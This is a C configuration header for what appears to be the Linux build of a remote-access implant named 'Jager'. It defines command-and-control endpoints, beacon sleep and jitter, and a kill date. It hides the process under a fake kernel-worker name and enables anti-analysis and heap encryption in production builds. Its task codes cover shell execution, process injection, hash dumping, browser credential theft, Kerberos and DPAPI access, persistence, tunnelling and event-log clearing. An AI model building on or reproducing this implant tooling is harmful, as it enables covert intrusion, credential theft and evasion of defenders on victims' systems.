#ifndef JAGER_LINUX_CONFIG_H
#define JAGER_LINUX_CONFIG_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

typedef uint8_t  BYTE;
typedef uint32_t DWORD;
typedef int      BOOL;

#ifndef TRUE
#define TRUE  1
#define FALSE 0
#endif

#ifndef C2_URL
#define C2_URL "https://127.0.0.1:443"
#endif

#ifndef C2_CHECKIN_PATH
#warning "C2_CHECKIN_PATH not overridden -- default path is a static IOC"
#define C2_CHECKIN_PATH "/api/v1/checkin"
#define C2_CHECKIN_PATH_DEFAULT 1
#endif

#ifndef C2_REGISTER_PATH
#warning "C2_REGISTER_PATH not overridden -- default path is a static IOC"
#define C2_REGISTER_PATH "/api/v1/register"
#endif

#ifndef C2_RESULT_PATH
#warning "C2_RESULT_PATH not overridden -- default path is a static IOC"
#define C2_RESULT_PATH "/api/v1/result"
#endif

#ifndef C2_STAGE_PATH
#warning "C2_STAGE_PATH not overridden -- default path is a static IOC"
#define C2_STAGE_PATH "/api/v1/stage"
#endif

#ifndef C2_TUNNEL_PATH
#define C2_TUNNEL_PATH "/api/v1/tunnel"
#endif

#ifndef SLEEP_SECONDS
#define SLEEP_SECONDS 60
#endif

#ifndef JITTER_PERCENT
#define JITTER_PERCENT 20
#endif

#ifndef MAX_RETRIES
#define MAX_RETRIES 5
#endif

#ifndef KILL_DATE
#define KILL_DATE 0
#endif

#ifndef USER_AGENT
#define USER_AGENT "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
#endif

#ifndef SLEEP_TECHNIQUE
#define SLEEP_TECHNIQUE 2  // Foliage (consistent with Windows builder numbering)
#endif

#ifndef ANTI_ANALYSIS
#ifdef JAGER_PRODUCTION
#define ANTI_ANALYSIS 1
#else
#define ANTI_ANALYSIS 0
#endif
#endif

#ifndef BUILD_ID
#warning "BUILD_ID not set by build pipeline -- using debug default"
#define BUILD_ID "debug-build"
#define BUILD_ID_DEFAULT 1
#endif

#ifdef JAGER_PRODUCTION
#if defined(BUILD_ID_DEFAULT)
#error "BUILD_ID required in production mode"
#endif
#if defined(C2_CHECKIN_PATH_DEFAULT)
#error "C2_CHECKIN_PATH must be overridden in production"
#endif
#if !defined(C2_CHECKIN_PATH_OVERRIDE)
#error "C2_CHECKIN_PATH must be overridden in production"
#endif
#endif

#ifndef BUILD_TOKEN
#warning "BUILD_TOKEN not set by build pipeline"
#define BUILD_TOKEN ""
#endif

#ifndef MASQUERADE_NAME
#define MASQUERADE_NAME "[kworker/u8:1-events]"
#endif

#ifndef HEAP_ENCRYPT
#define HEAP_ENCRYPT 1
#endif

#ifndef C2_URL_LIST
#define C2_URL_LIST ""
#endif

#define TASK_SLEEP           1
#define TASK_EXIT            2
#define TASK_SELF_DELETE     3
#define TASK_SHELL           10
#define TASK_POWERSHELL      11
#define TASK_EXECUTE         12
#define TASK_LS              20
#define TASK_CD              21
#define TASK_PWD             22
#define TASK_CAT             23
#define TASK_UPLOAD          24
#define TASK_DOWNLOAD        25
#define TASK_RM              26
#define TASK_MKDIR           27
#define TASK_CP              28
#define TASK_MV              29
#define TASK_PS              40
#define TASK_KILL_PROCESS    41
#define TASK_SPAWN           42
#define TASK_INJECT          43
#define TASK_IFCONFIG        50
#define TASK_NETSTAT         51
#define TASK_PORTSCAN        52
#define TASK_SOCKS_START     53
#define TASK_SOCKS_STOP      54
#define TASK_PORTFWD_ADD     55
#define TASK_PORTFWD_RM      56
#define TASK_PORTFWD_LIST    57
#define TASK_HASHDUMP        63
#define TASK_BROWSER_CREDS   104
#define TASK_PERSIST_REGISTRY 90
#define TASK_PERSIST_SERVICE 91
#define TASK_PERSIST_SCHTASK 92
#define TASK_BOF             14
#define TASK_SCREENSHOT      100
#define TASK_P2P_LISTEN      110
#define TASK_P2P_CONNECT     111
#define TASK_P2P_RELAY       112
#define TASK_DEFENSE_CLEAR_EVENTLOG 113
#define TASK_ARP_SCAN        114
#define TASK_KERBEROS_TICKETS 64
#define TASK_DPAPI           65

#define MAX_PATH_LEN         520
#define MAX_OUTPUT_SIZE      (1024 * 1024 * 4)
#define MAX_TASK_DATA        (1024 * 1024 * 50)
#define INITIAL_BUF_SIZE     4096

typedef struct {
    char  c2_url[256];
    char  checkin_path[128];
    char  register_path[128];
    char  result_path[128];
    char  tunnel_path[128];
    char  user_agent[256];
    char  implant_id[64];
    DWORD sleep_seconds;
    DWORD jitter_percent;
    DWORD max_retries;
    DWORD kill_date;
    BOOL  running;
} IMPLANT_CONFIG, *PIMPLANT_CONFIG;

#endif /* JAGER_LINUX_CONFIG_H */
